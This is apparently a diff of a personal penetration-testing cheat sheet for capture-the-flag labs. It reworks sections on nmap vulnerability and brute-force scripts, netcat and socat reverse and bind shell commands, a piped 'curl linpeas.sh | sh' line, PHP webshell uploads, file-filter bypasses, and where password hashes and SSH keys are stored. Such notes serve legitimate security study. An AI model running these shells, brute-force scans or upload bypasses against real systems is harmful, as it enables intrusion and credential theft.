@@ -239,6 +239,8 @@ extracts tar files
 shows cron jobs
 https://crontab-generator.org/
 
+holds cronjob info
+/etc/crontab
 # Ps
 
 `top`
@@ -248,32 +250,38 @@ lists all services
 
 # ----Handy Nix FILES----
 
->var/log
+>`var/log
 
->.bashrc
+>`.bashrc
 
 list of users
->/etc/passwd`
+`>/etc/passwd`
 
+SSH keys stored at 
+`>/home/user/.ssh`
 
+list of available shells 
+`/etc/shells
+
+holds cronjob info
+/etc/crontab
 
 logs access information, ip of logins etc
 
->/usr/share/seclists
+>`/usr/share/seclists
 
->/usr/share/wordlists
+>`/usr/share/wordlists
 
->The ~/.ssh folder is the default place to store these keys for OpenSSH
+>`The ~/.ssh folder is the default place to store these keys for OpenSSH
 
->/etc/hosts
+>`/etc/hosts
 
->/etc/passwd
+>`/etc/passwd
 
->password hashes are stored in /etc/shadow
-
->/var/log
+>`password hashes are stored in /etc/shadow
 
 shows logs
+>`/var/log
 
 | Category | Description | File | Example |
 |---|---|---|---|
@@ -404,24 +412,16 @@ remotes into IP
 # Enumeration
 
 ## Scan
-
-> ping [domain OR ip address]
-
 displays if there are open ports
-
->dig
-
+`ping [domain OR ip address]
 manually query recursive DNS servers
 displays TTL
-
->whois
-
+`dig
 Query who a domain name is registered to
-
->traceroute
-
+`whois
 see every intermediate step between your computer 
 and the resource that you requested
+`traceroute
 
 nmap [host / ip]
 
@@ -436,6 +436,15 @@ nmap [host / ip]
 - sS    stealth scan/TCP SYN Scan
 
 `nmap $ip -p- -A -v -top-ports 100`
+
+Runs a vulnerability test using a script
+`nmap -Pn --script vuln 192.168.1.105`
+
+Runs all most popular scripts
+`nmap -sC 192.168.122.1`
+
+Run all the scripts within a category
+`nmap --script discovery 192.168.122.1`
 
 ### WordPress blogs~
 ```
@@ -607,28 +616,6 @@ email analyser that uses SpamAssasin, VirusTotal & others
 
 ---
 
-# Priveledge Escalation
-
-```
-sudo -l
-```
-
->shows current users permissions
-
-first ssh into ip THEN
-```
-curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
-```
-
-```
-etc/ssh/ssshd_config
-```
-contains ssh configurations such as #PasswordAurhentication
-
-
-
-
----
 #  SQL Injection
 
 add a space character before registering a new account to gain the same read/write permissions as an account with the same name
@@ -761,6 +748,14 @@ javascript that is run on the client-side end of the web application.
 ---
 # BruteForce
 
+## Nmap
+
+WordPress brute force attack:
+`nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true' 192.168.1.105
+Brute force attack against MS-SQL:
+`nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt 192.168.1.105
+FTP brute force attack:
+`nmap --script ftp-brute -p 21 192.168.1.105`
 ## CeWL
 
 ```
@@ -907,23 +902,22 @@ Reverse Shell Generator
 
 ---
 
-## Reverse Shell example
+### Reverse Shell example
 
+starts a listener
 on the attacking machine
-```
-sudo nc -lvnp 443
-```
->starts a listener
+`sudo nc -lvnp 443
 
-on the target 
-```
-nc <LOCAL-IP> <PORT> -e /bin/bash
-```
+Run on the target to connect with a shell 
+`nc <LOCAL-IP> <PORT> -e /bin/bash
 
+OR
+Connecting to this  listener with netcat would result in a bind shell on the target
+`nc -lvnp <PORT> -e /bin/bash`
 
 ---
 
-## Bind Shell example
+### Bind Shell example
 
 On the attacking machine
 ```n
@@ -961,7 +955,7 @@ stty raw -echo; fg
 
 ---
 
-## rlwrap listener & stabilization
+### rlwrap listener & stabilization
 ```
 rlwrap nc -lvnp <port>
 ```
@@ -971,7 +965,7 @@ background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise
 
 ---
 
-## soCat stabilization
+### soCat stabilization
 
 use a webserver on the attacking machine inside the directory containing your socat binary 
 ```
@@ -987,7 +981,7 @@ get <LOCAL-IP>/socat -O /tmp/socat
 
 ---
 
-## Change terminal tty size~
+### Change terminal tty size~
 
 First, open another terminal and run 
 ```
@@ -1002,68 +996,13 @@ Next, in your reverse/bind shell, type in:
 ```
 This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.
 
-# socat
 
-### Reverse Shell
-
-```
-socat TCP-L:<port> -
-```
-basic reverse shell listener in socat
-
->will work on Linux or Windows
-
-```
-socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
-```
-windows reverse shell from target
-
-```console
-socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
-```
-Linux Reverse shell from target
 
 ---
 
-## Bind Shell
+# WebShells RCE Upload Vulnerabilities
 
-```console
-socat TCP-L:<PORT> EXEC:"bash -li"
-```
->target command
-
-```
-socat TCP-L:<PORT> EXEC:powershell.exe,pipes
-``` 
->listener for windows
-
-```
-socat TCP:<TARGET-IP>:<TARGET-PORT> -
-```
->used to connect from attacking machine
-
----
-
-## Stable tty reverse shell
-
->will only work on a Linux target
-
-```
-socat TCP-L:<port> FILE:`tty`,raw,echo=0 
-```
-
->listener
-
-```
-Gosh IDK man 
-```
-As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z
-
->https://tryhackme.com/room/introtoshells
-
----
-
-# PHP RCE from a File Upload
+there are a variety of webshells available on Kali by default at `/usr/share/webshells` -- including the infamous [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) -- a full reverse shell written in PHP
 
 ```
 <?php
@@ -1080,6 +1019,9 @@ then from here we can upload an RCE
 
 >https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 
+When the target is ***Windows***, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. 
+To obtain RCE using a web shell you need to use ***URL Encoded Powershell Reverse Shell***. This would be copied into the URL as the `cmd` argument:
+
 ---
 
 ### Client-side filtering and server-side filtering
@@ -1094,9 +1036,9 @@ then from here we can upload an RCE
 
 ---
 
-# Bypass file filtering
+## Bypass file filtering
 
-## Send the file directly to the upload point
+### Send the file directly to the upload point
 
 Why use the webpage with the filter, when you can send the file directly using a tool like curl?
 
@@ -1106,7 +1048,7 @@ curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
 
 >To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.
 
-# Bypassing Server-Side Filtering
+## Bypassing Server-Side Filtering
 
 >first step, google alternate extensions e.g. https://en.wikipedia.org/wiki/PHP
 
@@ -1115,7 +1057,7 @@ The key to bypassing any kind of server side filter is to enumerate and see what
 append a file type e.g. `webshell.jpg.php`
 collect a burpsuite capture to delete the filter either *before* the page loads *or before* the file is uploaded
 
-# Bypassing using magic numbers
+### Bypassing using magic numbers
 
 - use nano to add "A" the correct number of times to the start of the file
 - use hexeditor to change those characters to magic numbers associated to the target file type
